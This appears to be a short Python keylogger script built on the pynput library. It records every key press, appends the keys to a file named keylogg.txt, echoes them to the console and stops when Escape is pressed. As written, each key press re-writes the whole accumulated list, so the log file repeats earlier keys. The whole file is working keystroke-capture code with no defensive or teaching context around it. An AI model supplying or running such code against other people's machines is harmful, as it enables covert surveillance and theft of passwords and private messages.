from pynput.keyboard import Key, Listener
k=[]
def on_press(key):
    k.append(key)
    write(k)
    print(key)

def write(dat):
    with open("keylogg.txt","a") as f:
        for i in dat:
            new_dat = str(i).replace("'",'')
            f.write(new_dat)
            f.write(" ")
     

def on_release(key):
    if key== Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release)as l:
    l.join()